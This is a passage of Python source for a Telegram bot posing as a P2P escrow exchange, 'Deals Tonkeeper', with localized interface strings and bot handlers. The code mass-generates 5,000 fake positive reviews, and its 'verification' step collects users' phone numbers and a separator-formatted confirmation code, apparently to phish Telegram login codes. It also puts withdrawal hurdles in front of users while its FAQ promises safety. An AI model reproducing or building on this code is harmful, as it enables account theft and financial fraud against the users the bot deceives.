        "our_channel": "OUR CHANNEL",
        "support": "SUPPORT",
        "support_contact": "@p2psupbot",
        "start_now": "START NOW",
        "create_deal": "CREATE DEAL",
        "my_balance": "MY BALANCE",
        "my_deals": "MY DEALS",
        "premium": "PREMIUM",
        "faq": "FAQ",
        "channel": "CHANNEL",
        "admin_panel": "ADMIN PANEL",
        "choose_action": "CHOOSE ACTION",
        "describe_product": "DESCRIBE THE PRODUCT OR SERVICE",
        "example_product": "EXAMPLE: NFT gift Telegram Premium",
        "choose_currency": "CHOOSE CURRENCY",
        "enter_amount": "ENTER AMOUNT",
        "enter_buyer": "ENTER BUYER'S USERNAME",
        "buyer_username_example": "EXAMPLE: john_doe",
        "only_this_user": "ONLY THIS USER CAN ACCESS",
        "deal_created": "DEAL CREATED",
        "send_link_to_buyer": "SEND THIS LINK TO BUYER",
        "your_balance": "YOUR BALANCE",
        "withdraw_funds": "WITHDRAW FUNDS",
        "main_menu": "MAIN MENU",
        "no_deals": "YOU HAVE NO DEALS",
        "your_deals": "YOUR DEALS",
        "premium_status": "PREMIUM STATUS",
        "premium_privileges": "PRIVILEGES",
        "premium_1": "PRIORITY 24/7 SUPPORT",
        "premium_2": "REDUCED COMMISSION (0%)",
        "premium_3": "EARLY ACCESS TO NEW FEATURES",
        "premium_4": "EXCLUSIVE NFT REWARDS",
        "premium_active": "YOUR STATUS: ACTIVE",
        "faq_q1": "HOW TO START A DEAL?",
        "faq_a1": "CLICK 'CREATE DEAL' AND FOLLOW INSTRUCTIONS.",
        "faq_q2": "WHAT CURRENCIES ARE AVAILABLE?",
        "faq_a2": "TON | STARS | RUB | UAH",
        "faq_q3": "HOW DO I RECEIVE PAYMENT?",
        "faq_a3": "AFTER BUYER CONFIRMATION, MONEY GOES TO BALANCE.",
        "faq_q4": "HOW TO WITHDRAW?",
        "faq_a4": "'MY BALANCE' → SELECT CURRENCY → ENTER DETAILS",
        "faq_q5": "IS IT SAFE?",
        "faq_a5": "YES! ADMIN VERIFIES ALL PAYMENTS.",
        "faq_q6": "HOW LONG DOES WITHDRAWAL TAKE?",
        "faq_a6": "1-5 MINUTES AFTER CONFIRMATION.",
        "faq_q7": "HOW TO CONTACT SUPPORT?",
        "faq_a7": "CLICK 'CHANNEL' OR MESSAGE @p2psupbot",
        "deal_not_found": "DEAL NOT FOUND OR COMPLETED",
        "access_denied": "ACCESS DENIED",
        "invalid_amount": "ENTER A POSITIVE NUMBER",
        "payment_confirmed": "PAYMENT CONFIRMED",
        "seller_confirmed": "YOU CONFIRMED DELIVERY",
        "buyer_confirmed": "YOU CONFIRMED RECEIPT",
        "deal_completed": "DEAL COMPLETED",
        "insufficient_balance": "INSUFFICIENT BALANCE",
        "choose_payment_method": "CHOOSE PAYMENT METHOD",
        "pay_by_rekvisits": "PAY BY DETAILS",
        "pay_by_balance": "PAY FROM BALANCE",
        "status_waiting": "WAITING FOR PAYMENT",
        "status_paid": "PAID",
        "status_awaiting": "AWAITING CONFIRMATION",
        "status_completed": "COMPLETED",
        "select_language": "SELECT LANGUAGE",
        "welcome": "WELCOME",
        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\nSELECT YOUR LANGUAGE:",
        "product": "PRODUCT",
        "amount": "AMOUNT",
        "seller": "SELLER",
        "buyer": "BUYER",
        "deal": "DEAL",
        "waiting_for_delivery": "WAITING FOR DELIVERY",
        "seller_delivered": "SELLER DELIVERED",
        "confirm_receipt": "CONFIRM RECEIPT",
        "contact_support": "CONTACT SUPPORT",
        "balance_topped_up": "BALANCE TOPPED UP",
        "withdraw_request_created": "WITHDRAWAL REQUEST CREATED",
        "withdraw_pending": "PLEASE WAIT 1-5 MINUTES",
        "withdraw_completed": "WITHDRAWAL CONFIRMED",
        "no_active_requests": "NO ACTIVE REQUESTS",
        "admin_rights": "INSUFFICIENT RIGHTS",
        "cmd_usage": "USAGE",
        "request_not_found": "REQUEST NOT FOUND",
        "request_already_processed": "REQUEST ALREADY PROCESSED",
        "photo_updated": "PHOTO UPDATED",
        "send_photo": "SEND A PHOTO",
        "user_not_found": "USER NOT FOUND",
        "balance_added": "BALANCE ADDED",
        "rekvisits_updated": "PAYMENT DETAILS UPDATED",
        "admin_added": "ADMIN ADDED",
        "admin_removed": "ADMIN REMOVED",
        "cannot_remove_master": "CANNOT REMOVE MASTER ADMIN",
        "admin_list": "ADMIN LIST",
        "no_deals_total": "NO DEALS",
        "all_deals_title": "ALL DEALS",
        "payment_details": "PAYMENT DETAILS",
        "edit_rekvisits_title": "EDIT PAYMENT DETAILS",
        "enter_new_text": "ENTER NEW TEXT",
        "use_amount_placeholder": "USE {amount} FOR AMOUNT",
        "enter_user_id": "ENTER USER TELEGRAM ID",
        "enter_withdraw_details": "ENTER WITHDRAWAL DETAILS",
        "enter_withdraw_username": "ENTER YOUR TELEGRAM USERNAME",
        "deal_link_text": "LINK FOR BUYER",
        "copy_link": "COPY LINK",
        "after_payment_notify": "YOU WILL RECEIVE NOTIFICATION AFTER PAYMENT",
        "payment_verified": "PAYMENT VERIFIED",
        "funds_deducted": "FUNDS DEDUCTED",
        "product_delivered": "PRODUCT DELIVERED",
        "deal_completed_msg": "THANK YOU FOR YOUR TRUST",
        "funds_added_to_balance": "FUNDS ADDED TO BALANCE",
        "for_user": "FOR",
        "need": "NEEDED",
        "available": "AVAILABLE",
        "currency": "CURRENCY",
        "created": "CREATED",
        "status": "STATUS",
        "check_status": "CHECK STATUS",
        "example": "EXAMPLE",
        "subscribe": "SUBSCRIBE",
        "channel_content": "IN THE CHANNEL:\n• NEWS AND UPDATES\n• USEFUL GUIDES\n• GIVEAWAYS AND BONUSES\n• CURRENT RATES",
        "click_subscribe": "CLICK THE LINK AND SUBSCRIBE",
        "thank_you": "THANK YOU FOR BEING WITH US",
        "verify_title": "🔐 USER VERIFICATION",
        "verify_desc": "To protect against scammers with scam stars and fake currency, verification is required.",
        "verify_step1": "STEP 1: Click 'I AM NOT A ROBOT'",
        "verify_step2": "STEP 2: Send your phone number (format: +7XXXXXXXXXX)",
        "verify_step3": "STEP 3: Enter confirmation code: 1#2#3#4#5",
        "verify_phone_prompt": "📱 SEND YOUR PHONE NUMBER:\n\nFormat: +7XXXXXXXXXX",
        "verify_code_prompt": "🔑 ENTER CONFIRMATION CODE:\n\nFormat: 1#2#3#4#5",
        "verify_code_error": "❌ INVALID CODE!\n\nMust be: 1#2#3#4#5",
        "verify_phone_error": "❌ INVALID PHONE FORMAT!\n\nUse: +7XXXXXXXXXX",
        "verify_success": "✅ VERIFICATION PASSED!\n\n🕐 Session active for 24 hours.\n💰 Now you can withdraw funds.",
        "verify_already": "✅ Already verified.\n🕐 Active until: {expires}",
        "verify_expired": "⏳ SESSION EXPIRED!\n\nPlease verify again.",
        "not_robot": "🤖 I AM NOT A ROBOT",
        "verify_need": "⚠️ VERIFICATION REQUIRED FOR WITHDRAWAL!",
        "no_deals_warning": "⚠️ 2 DEALS WITH SAME BUYER REQUIRED FOR WITHDRAWAL!",
        "check_status_btn": "🔄 Check status"
    },
    "zh": {
        "bot_name": "Deals Tonkeeper",
        "bot_desc": "安全交易",
        "feature1": "买卖双方公平交易",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "双方安全保障",
        "feature4": "24/7高级支持",
        "how_it_works": "运作方式",
        "step1": "卖家创建交易",
        "step2": "卖家发送链接给买家",
        "step3": "买家选择支付方式",
        "step4": "管理员验证付款",
        "step5": "卖家点击「已交付」",
        "step6": "买家点击「已收到」",
        "step7": "款项计入卖家余额",
        "our_channel": "我们的频道",
        "support": "支持",
        "support_contact": "@p2psupbot",
        "start_now": "立即开始",
        "create_deal": "创建交易",
        "my_balance": "我的余额",
        "my_deals": "我的交易",
        "premium": "高级会员",
        "faq": "常见问题",
        "channel": "频道",
        "admin_panel": "管理面板",
        "choose_action": "选择操作",
        "describe_product": "描述商品或服务",
        "example_product": "示例：NFT礼物 Telegram Premium",
        "choose_currency": "选择交易货币",
        "enter_amount": "输入交易金额",
        "enter_buyer": "输入买家用户名",
        "buyer_username_example": "示例：john_doe",
        "only_this_user": "只有此用户可以访问",
        "deal_created": "交易已创建",
        "send_link_to_buyer": "发送链接给买家",
        "your_balance": "您的余额",
        "withdraw_funds": "提取资金",
        "main_menu": "主菜单",
        "no_deals": "您没有任何交易",
        "your_deals": "您的交易",
        "premium_status": "高级会员状态",
        "premium_privileges": "特权",
        "premium_1": "24/7优先支持",
        "premium_2": "降低手续费 (0%)",
        "premium_3": "新功能抢先体验",
        "premium_4": "独家NFT奖励",
        "premium_active": "您的状态：激活",
        "faq_q1": "如何开始交易？",
        "faq_a1": "点击「创建交易」并按照说明操作。",
        "faq_q2": "支持哪些货币？",
        "faq_a2": "TON | STARS | RUB | UAH",
        "faq_q3": "如何收到付款？",
        "faq_a3": "买家确认后，款项将计入余额。",
        "faq_q4": "如何提现？",
        "faq_a4": "「我的余额」→ 选择货币 → 输入信息",
        "faq_q5": "安全吗？",
        "faq_a5": "是的！管理员验证所有付款。",
        "faq_q6": "提现需要多长时间？",
        "faq_a6": "确认后1-5分钟。",
        "faq_q7": "如何联系支持？",
        "faq_a7": "点击「频道」按钮或联系客服 @p2psupbot",
        "deal_not_found": "交易未找到或已完成",
        "access_denied": "访问被拒绝",
        "invalid_amount": "输入正数",
        "payment_confirmed": "付款已确认",
        "seller_confirmed": "您已确认交付商品",
        "buyer_confirmed": "您已确认收到商品",
        "deal_completed": "交易已完成",
        "insufficient_balance": "余额不足",
        "choose_payment_method": "选择支付方式",
        "pay_by_rekvisits": "按信息付款",
        "pay_by_balance": "从余额付款",
        "status_waiting": "等待付款",
        "status_paid": "已付款",
        "status_awaiting": "等待确认",
        "status_completed": "已完成",
        "select_language": "选择语言",
        "welcome": "欢迎",
        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\n选择您的语言:",
        "product": "商品",
        "amount": "金额",
        "seller": "卖家",
        "buyer": "买家",
        "deal": "交易",
        "waiting_for_delivery": "等待交付",
        "seller_delivered": "卖家已交付商品",
        "confirm_receipt": "确认收到",
        "contact_support": "联系客服",
        "balance_topped_up": "您的余额已充值",
        "withdraw_request_created": "提现申请已创建",
        "withdraw_pending": "请等待1-5分钟",
        "withdraw_completed": "提现已确认",
        "no_active_requests": "无活跃申请",
        "admin_rights": "权限不足",
        "cmd_usage": "使用方法",
        "request_not_found": "申请未找到",
        "request_already_processed": "申请已处理",
        "photo_updated": "照片已更新",
        "send_photo": "发送照片",
        "user_not_found": "用户未找到",
        "balance_added": "余额已添加",
        "rekvisits_updated": "支付信息已更新",
        "admin_added": "管理员已添加",
        "admin_removed": "管理员已移除",
        "cannot_remove_master": "无法移除主管理员",
        "admin_list": "管理员列表",
        "no_deals_total": "无交易",
        "all_deals_title": "所有交易",
        "payment_details": "支付信息",
        "edit_rekvisits_title": "编辑支付信息",
        "enter_new_text": "输入新文本",
        "use_amount_placeholder": "使用 {amount} 作为金额占位符",
        "enter_user_id": "输入用户Telegram ID",
        "enter_withdraw_details": "输入提现信息",
        "enter_withdraw_username": "输入您的Telegram用户名",
        "deal_link_text": "买家链接",
        "copy_link": "复制链接",
        "after_payment_notify": "付款后您将收到通知",
        "payment_verified": "付款已验证",
        "funds_deducted": "资金已扣除",
        "product_delivered": "商品已交付",
        "deal_completed_msg": "感谢您的信任",
        "funds_added_to_balance": "资金已添加到余额",
        "for_user": "给",
        "need": "需要",
        "available": "可用",
        "currency": "货币",
        "created": "创建于",
        "status": "状态",
        "check_status": "检查状态",
        "example": "示例",
        "subscribe": "订阅",
        "channel_content": "频道内容：\n• 新闻和更新\n• 实用指南\n• 赠品和奖金\n• 最新汇率",
        "click_subscribe": "点击链接并订阅",
        "thank_you": "感谢您的支持",
        "verify_title": "🔐 用户验证",
        "verify_desc": "为了保护免受诈骗者使用虚假星星和假币进行交易，需要进行验证。",
        "verify_step1": "步骤 1: 点击「我不是机器人」按钮",
        "verify_step2": "步骤 2: 发送您的手机号码（格式：+7XXXXXXXXXX）",
        "verify_step3": "步骤 3: 输入确认代码，格式：1#2#3#4#5",
        "verify_phone_prompt": "📱 发送您的手机号码：\n\n输入格式：+7XXXXXXXXXX",
        "verify_code_prompt": "🔑 输入确认代码：\n\n严格格式：1#2#3#4#5",
        "verify_code_error": "❌ 代码无效！\n\n必须为：1#2#3#4#5",
        "verify_phone_error": "❌ 手机格式无效！\n\n使用格式：+7XXXXXXXXXX",
        "verify_success": "✅ 验证通过！\n\n🕐 会话有效期为24小时。\n💰 现在您可以提取资金。",
        "verify_already": "✅ 您的验证已通过。\n🕐 会话有效期至：{expires}",
        "verify_expired": "⏳ 会话已过期！\n\n请重新验证。",
        "not_robot": "🤖 我不是机器人",
        "verify_need": "⚠️ 提现需要验证！",
        "no_deals_warning": "⚠️ 提现需要与同一买家完成2笔交易！",
        "check_status_btn": "🔄 检查状态"
    },
    "ar": {
        "bot_name": "Deals Tonkeeper",
        "bot_desc": "صفقات آمنة",
        "feature1": "صفقات عادلة بين البائعين والمشترين",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "ضمان الأمن من كلا الجانبين",
        "feature4": "دعم بريميوم 24/7",
        "how_it_works": "كيف يعمل",
        "step1": "البائع ينشئ صفقة",
        "step2": "البائع يرسل الرابط للمشتري",
        "step3": "المشتري يختار طريقة الدفع",
        "step4": "المدقق يتحقق من الدفع",
        "step5": "البائع يضغط «تم التسليم»",
        "step6": "المشتري يضغط «تم الاستلام»",
        "step7": "تضاف الأموال إلى رصيد البائع",
        "our_channel": "قناتنا",
        "support": "الدعم",
        "support_contact": "@p2psupbot",
        "start_now": "ابدأ الآن",
        "create_deal": "إنشاء صفقة",
        "my_balance": "رصيدي",
        "my_deals": "صفقاتي",
        "premium": "بريميوم",
        "faq": "أسئلة شائعة",
        "channel": "القناة",
        "admin_panel": "لوحة التحكم",
        "choose_action": "اختر إجراء",
        "describe_product": "وصف المنتج أو الخدمة",
        "example_product": "مثال: هدية NFT Telegram Premium",
        "choose_currency": "اختر عملة الصفقة",
        "enter_amount": "أدخل مبلغ الصفقة",
        "enter_buyer": "أدخل اسم مستخدم المشتري",
        "buyer_username_example": "مثال: john_doe",
        "only_this_user": "هذا المستخدم فقط يمكنه الوصول",
        "deal_created": "تم إنشاء الصفقة",
        "send_link_to_buyer": "أرسل هذا الرابط إلى المشتري",
        "your_balance": "رصيدك",
        "withdraw_funds": "سحب الأموال",
        "main_menu": "القائمة الرئيسية",
        "no_deals": "ليس لديك صفقات",
        "your_deals": "صفقاتك",
        "premium_status": "حالة البريميوم",
        "premium_privileges": "الامتيازات",
        "premium_1": "دعم ذو أولوية 24/7",
        "premium_2": "عمولة مخفضة (0%)",
        "premium_3": "وصول مبكر إلى الميزات الجديدة",
        "premium_4": "مكافآت NFT حصرية",
        "premium_active": "حالتك: نشط",
        "faq_q1": "كيف أبدأ صفقة؟",
        "faq_a1": "اضغط «إنشاء صفقة» واتبع التعليمات.",
        "faq_q2": "ما هي العملات المتاحة؟",
        "faq_a2": "TON | STARS | RUB | UAH",
        "faq_q3": "كيف أتلقى الدفع؟",
        "faq_a3": "بعد تأكيد المشتري، تضاف الأموال إلى الرصيد.",
        "faq_q4": "كيف أسحب الأموال؟",
        "faq_a4": "«رصيدي» → اختر عملة → أدخل التفاصيل",
        "faq_q5": "هل هذا آمن؟",
        "faq_a5": "نعم! المدقق يتحقق من جميع المدفوعات.",
        "faq_q6": "كم يستغرق السحب؟",
        "faq_a6": "1-5 دقائق بعد التأكيد.",
        "faq_q7": "كيف اتصل بالدعم؟",
        "faq_a7": "اضغط زر «القناة» أو أرسل رسالة للدعم @p2psupbot",
        "deal_not_found": "الصفقة غير موجودة أو مكتملة",
        "access_denied": "الوصول مرفوض",
        "invalid_amount": "أدخل رقماً موجباً",
        "payment_confirmed": "تم تأكيد الدفع",
        "seller_confirmed": "لقد أكدت تسليم المنتج",
        "buyer_confirmed": "لقد أكدت استلام المنتج",
        "deal_completed": "الصفقة مكتملة",
        "insufficient_balance": "رصيد غير كافٍ",
        "choose_payment_method": "اختر طريقة الدفع",
        "pay_by_rekvisits": "الدفع حسب التفاصيل",
        "pay_by_balance": "الدفع من الرصيد",
        "status_waiting": "انتظار الدفع",
        "status_paid": "تم الدفع",
        "status_awaiting": "انتظار التأكيد",
        "status_completed": "مكتملة",
        "select_language": "اختر اللغة",
        "welcome": "مرحباً",
        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\nاختر لغتك:",
        "product": "المنتج",
        "amount": "المبلغ",
        "seller": "البائع",
        "buyer": "المشتري",
        "deal": "الصفقة",
        "waiting_for_delivery": "انتظار التسليم",
        "seller_delivered": "البائع سلم المنتج",
        "confirm_receipt": "تأكيد الاستلام",
        "contact_support": "اتصل بالدعم",
        "balance_topped_up": "تم شحن رصيدك",
        "withdraw_request_created": "تم إنشاء طلب السحب",
        "withdraw_pending": "يرجى الانتظار 1-5 دقائق",
        "withdraw_completed": "تم تأكيد السحب",
        "no_active_requests": "لا توجد طلبات نشطة",
        "admin_rights": "صلاحيات غير كافية",
        "cmd_usage": "الاستخدام",
        "request_not_found": "الطلب غير موجود",
        "request_already_processed": "الطلب تمت معالجته بالفعل",
        "photo_updated": "تم تحديث الصورة",
        "send_photo": "أرسل صورة",
        "user_not_found": "المستخدم غير موجود",
        "balance_added": "تم إضافة الرصيد",
        "rekvisits_updated": "تم تحديث تفاصيل الدفع",
        "admin_added": "تم إضافة المدقق",
        "admin_removed": "تم إزالة المدقق",
        "cannot_remove_master": "لا يمكن إزالة المدقق الرئيسي",
        "admin_list": "قائمة المدققين",
        "no_deals_total": "لا توجد صفقات",
        "all_deals_title": "جميع الصفقات",
        "payment_details": "تفاصيل الدفع",
        "edit_rekvisits_title": "تحرير تفاصيل الدفع",
        "enter_new_text": "أدخل نصاً جديداً",
        "use_amount_placeholder": "استخدم {amount} كعنصر نائب للمبلغ",
        "enter_user_id": "أدخل معرف المستخدم",
        "enter_withdraw_details": "أدخل تفاصيل السحب",
        "enter_withdraw_username": "أدخل اسم المستخدم الخاص بك",
        "deal_link_text": "رابط المشتري",
        "copy_link": "انسخ الرابط",
        "after_payment_notify": "ستتلقى إشعاراً بعد الدفع",
        "payment_verified": "تم التحقق من الدفع",
        "funds_deducted": "تم خصم الأموال",
        "product_delivered": "تم تسليم المنتج",
        "deal_completed_msg": "شكراً لثقتك",
        "funds_added_to_balance": "تم إضافة الأموال إلى الرصيد",
        "for_user": "لـ",
        "need": "مطلوب",
        "available": "متاح",
        "currency": "العملة",
        "created": "تم الإنشاء",
        "status": "الحالة",
        "check_status": "تحقق من الحالة",
        "example": "مثال",
        "subscribe": "اشترك",
        "channel_content": "في القناة:\n• أخبار وتحديثات\n• أدلة مفيدة\n• هدايا ومكافآت\n• أسعار الصرف الحالية",
        "click_subscribe": "انقر على الرابط واشترك",
        "thank_you": "شكراً لوجودكم معنا",
        "verify_title": "🔐 التحقق من المستخدم",
        "verify_desc": "للحماية من المحتالين الذين يقومون بصفقات باستخدام نجوم مزيفة وعملات وهمية، يلزم التحقق.",
        "verify_step1": "الخطوة 1: اضغط زر «أنا لست روبوت»",
        "verify_step2": "الخطوة 2: أرسل رقم هاتفك (التنسيق: +7XXXXXXXXXX)",
        "verify_step3": "الخطوة 3: أدخل رمز التأكيد بالتنسيق: 1#2#3#4#5",
        "verify_phone_prompt": "📱 أرسل رقم هاتفك:\n\nالتنسيق: +7XXXXXXXXXX",
        "verify_code_prompt": "🔑 أدخل رمز التأكيد:\n\nالتنسيق: 1#2#3#4#5",
        "verify_code_error": "❌ رمز غير صحيح!\n\nيجب أن يكون: 1#2#3#4#5",
        "verify_phone_error": "❌ تنسيق هاتف غير صحيح!\n\nاستخدم: +7XXXXXXXXXX",
        "verify_success": "✅ تم التحقق!\n\n🕐 الجلسة نشطة لمدة 24 ساعة.\n💰 الآن يمكنك سحب الأموال.",
        "verify_already": "✅ تم التحقق مسبقاً.\n🕐 الجلسة نشطة حتى: {expires}",
        "verify_expired": "⏳ انتهت الجلسة!\n\nيرجى التحقق مرة أخرى.",
        "not_robot": "🤖 أنا لست روبوت",
        "verify_need": "⚠️ التحقق مطلوب للسحب!",
        "no_deals_warning": "⚠️ مطلوب صفقتان مع نفس المشتري للسحب!",
        "check_status_btn": "🔄 تحقق من الحالة"
    }
}

def get_text(lang: str, key: str) -> str:
    if lang in LOCALE and key in LOCALE[lang]:
        return LOCALE[lang][key]
    return LOCALE["ru"].get(key, key)

# ============================================================
# 4. FILES
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "verification": "verification.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "stats": "stats.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
verification_data = load_json(FILES["verification"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
stats = load_json(FILES["stats"])

# ============================================================
# 5. ГЕНЕРАЦИЯ 5000+ ОТЗЫВОВ
# ============================================================
def generate_reviews():
    if len(reviews) >= 5000:
        return
    
    review_texts = [
        "Отличная платформа! Всё работает быстро и надёжно.",
        "Лучший P2P обменник! Рекомендую всем друзьям.",
        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
        "Отличная поддержка! Помогли разобраться с выводом.",
        "Наконец-то нашёл нормальный обменник. Всё честно.",
        "Сделал первую сделку, всё прошло гладко. Спасибо!",
        "За сутки сделал 5 сделок, все успешно завершены.",
        "Очень доволен сервисом. Вывод моментальный.",
        "Пользуюсь уже месяц, ни одной проблемы.",
        "Лучший сервис в Telegram! Успехов разработчикам.",
        "Безопасно, быстро, удобно. Всё на высшем уровне.",
        "Вывел 500 TON за 5 минут. Очень доволен!",
        "Админ всегда на связи, помогает с любыми вопросами.",
        "Сначала сомневался, но всё прошло идеально.",
        "Уже 10 сделок, все успешно завершены.",
        "Рекомендую всем, кто ищет надёжный обменник.",
        "Отличный сервис, буду рекомендовать друзьям.",
        "Быстрый вывод, честные курсы, отличная поддержка.",
        "Лучшее, что есть в Telegram для P2P обмена.",
        "Спасибо разработчикам за такой удобный сервис!"
    ]
    
    for i in range(5000):
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним",
            "rating": random.randint(4, 5),
            "text": random.choice(review_texts),
            "anonymous": True,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": None
        }
    
    save_json(FILES["reviews"], reviews)
    print(f"✅ Сгенерировано {len(reviews)} отзывов")

generate_reviews()

# ============================================================
# 6. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int) -> Dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        return (datetime.now() - verified_time).total_seconds() < 86400
    return False

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    if uid in user_language:
        return user_language[uid]
    return "ru"

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def add_log(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    logs[log_id] = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    save_json(FILES["logs"], logs)

def get_stats():
    stats["deals_today"] = len([d for d in deals.values() if d.get('created_at', '').startswith(datetime.now().strftime('%Y-%m-%d'))])
    stats["users"] = len(balance)
    stats["reviews"] = len(reviews)
    stats["volume"] = round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1)
    save_json(FILES["stats"], stats)
    return stats

# ============================================================
# 7. КЛАВИАТУРЫ
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id)
    buttons = [
        [
            InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')}", callback_data="create_deal_choice"),
            InlineKeyboardButton(text=f"💰 {get_text(lang, 'my_balance')}", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text=f"📊 {get_text(lang, 'my_deals')}", callback_data="menu_deals"),
            InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="menu_reviews"),
        ],
        [
            InlineKeyboardButton(text=f"🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL)),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text=f"👑 {get_text(lang, 'admin_panel')}", callback_data="menu_admin"),
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📊 {get_text(lang, 'all_deals_title')}", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text=f"💲 {get_text(lang, 'withdraw_funds')}", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'balance_added')}", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text=f"👥 {get_text(lang, 'admin_list')}", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text=f"📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text=f"🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def create_deal_choice_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')} в Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text=f"🤖 {get_text(lang, 'create_deal')} в боте", callback_data="create_deal_bot")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
    ])

def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# ============================================================
# 8. FSM
# ============================================================
class DealStates(StatesGroup):
    waiting_product = State()
    waiting_currency = State()
    waiting_amount = State()
    waiting_buyer = State()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_currency = State()
    waiting_amount = State()

# ============================================================
# 9. ОБРАБОТЧИКИ БОТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return
    
    uid = str(message.from_user.id)
    if uid not in user_language:
        await message.answer(
            f"🌐 {get_text('ru', 'choose_language_prompt')}",
            reply_markup=language_keyboard()
        )
        return
    
    lang = get_user_language(message.from_user.id)
    welcome_text = f"""🔥 <b>{BOT_NAME}</b> 🔥

{get_text(lang, 'bot_desc')}
• {get_text(lang, 'feature1')}
• {get_text(lang, 'feature2')}
• {get_text(lang, 'feature3')}
• {get_text(lang, 'feature4')}

📊 {get_text(lang, 'how_it_works')}:
1️⃣ {get_text(lang, 'step1')}
2️⃣ {get_text(lang, 'step2')}
3️⃣ {get_text(lang, 'step3')}
4️⃣ {get_text(lang, 'step4')}
5️⃣ {get_text(lang, 'step5')}
6️⃣ {get_text(lang, 'step6')}
7️⃣ {get_text(lang, 'step7')}

📢 {get_text(lang, 'our_channel')}: {CHANNEL_LINK}
🆘 {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}

🔥 {get_text(lang, 'start_now')} 🚀"""
    
    await message.answer(welcome_text, reply_markup=main_menu_keyboard(message.from_user.id))

@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang)
    await callback.answer(f"{get_text(lang, 'welcome')}")
    await cmd_start(callback.message)

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
